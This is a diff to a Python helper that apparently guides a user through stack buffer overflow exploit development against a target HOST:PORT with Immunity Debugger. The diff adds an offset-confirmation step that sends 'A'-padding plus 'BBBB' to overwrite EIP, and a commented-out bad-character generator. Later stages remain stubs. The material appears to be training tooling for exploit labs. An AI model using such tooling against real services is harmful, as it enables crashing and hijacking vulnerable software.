@@ -16,6 +16,7 @@
     # [3] Finding Bad Characters
     # [4] Finding the Jump Point
     # [5] Final Buffer Overflow Exploit
+    # Count functionality
 
 ## Pending Fixes:
     # Error message to be added if incorrect args entered in terminal.
@@ -64,7 +65,7 @@ Other Options:
         menuInput = input(f"{color.GREEN}[ENTER] to start from [1], OR enter option: {color.END}")
     else:
         menuInput = input(f"{color.GREEN}Enter option: {color.END}")
-        
+
     if menuInput == "C" or menuInput == "c":
         checklist()
     elif menuInput == "1" or menuInput == "":
@@ -153,15 +154,36 @@ Make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n""")
     patternOffsetOutput = patternO.stdout
     print(f"\n{patternOffsetOutput}")
     global offset
-    offset = patternOffsetOutput[26:]
-    print(offset)
-    badCharsTest()
+    offset = int(patternOffsetOutput[26:])
+    # print(offset)
+    print(f"""Now we need to test whether we are on target and have indeed successfully discovered the offset.\n
+We will now send a payload of Four 'B' characters ('42424242' in hex) with our offset of {offset}.
+If we are successful the EIP will read '42424242' as these 'B' should land exactly.\n
+Again, make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n""")
+    BTest = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
+    if BTest == "menu":
+        menu()
+    else:
+        True
+    offsetLoad = "A" * offset + "B" * 4
+    # bufferSend(offsetLoad)
+    if bufferSend(offsetLoad) == 0:
+        print(f"""The program should now have crashed and the EIP should read '42424242'.\n
+This means we are on target and now we will move on to the finding Bad Characters.\n""")
+        badCharsTest()
+    else:
+        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
+        offsetTest()
     
 # [3] Finding Bad Characters:
 
 def badCharsTest():
-    print("BadChars Test")
-    print(offset)
+    print(f"""\n{color.BOLD}{color.UNDERLINE}[3] Finding Bad Characters:{color.END}\n""")
+    # If Offset not already found from [2] then ask user to enter.
+    # Character generation:
+    # for x in range(1,256):
+    #     print("\\x" + "{:02x}".format(x), end="")
+    # print()
     sys.exit()
 
 # [4] Finding the Jump Point:
@@ -200,5 +222,3 @@ To be used in conjunction with {color.BOLD}Immunity Debugger{color.END} and the 
 Target is @ {color.BOLD}{color.DARKCYAN}{HOST}:{PORT}{color.END}""")
 count = 0
 menu()
-
-
